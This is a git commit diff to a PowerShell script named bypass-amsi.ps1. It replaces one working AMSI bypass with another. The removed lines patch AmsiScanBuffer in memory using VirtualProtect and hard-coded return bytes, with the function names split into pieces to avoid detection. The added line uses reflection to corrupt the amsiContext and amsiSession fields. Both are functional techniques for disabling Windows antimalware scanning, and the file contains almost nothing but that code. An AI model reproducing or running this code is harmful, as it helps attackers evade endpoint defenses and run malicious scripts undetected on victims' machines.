c1bc060ddf7ee6022c0725e3543e6617b9652dfd
robertoaguilarfields-blip <robertoaguilarfields@gmail.com>
2025-09-26 04:15:29 +0200

    bypass-amsi.ps1

--- bypass-amsi.ps1
+++ bypass-amsi.ps1
@@ -1,32 +1,3 @@
-$MethodDefinition = @"
-    [DllImport(`"kernel32`")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 
-    [DllImport(`"kernel32`")]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport(`"kernel32`")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-"@
-
-$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
-$var = 'am'
-$var2 = $var + 'si'
-$var3 = $var2 + ".d" + "ll"
-$handle = [Win32.Kernel32]::GetModuleHandle($var3);
-[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'Am'+'siS'+'can'+'Buf'+'fer');
-[UInt32]$Size = 0x5;
-[UInt32]$ProtectFlag = 0x40;
-[UInt32]$OldProtectFlag = 0;
-[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
-
-$arr = New-Object Byte[] 6
-
-$arr[0] = [Byte]([UInt32]0xB8)
-$arr[1] = [Byte]([UInt32]0x57)
-$arr[2] = [Byte]([UInt32]0x00)
-$arr[3] = [Byte]([UInt32]0x07)
-$arr[4] = [Byte]([UInt32]0x80)
-$arr[5] = [Byte]([UInt32]0xC3)
-
-[System.Runtime.InteropServices.Marshal]::Copy($arr, 0, $BufferAddress, $arr.Length);
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
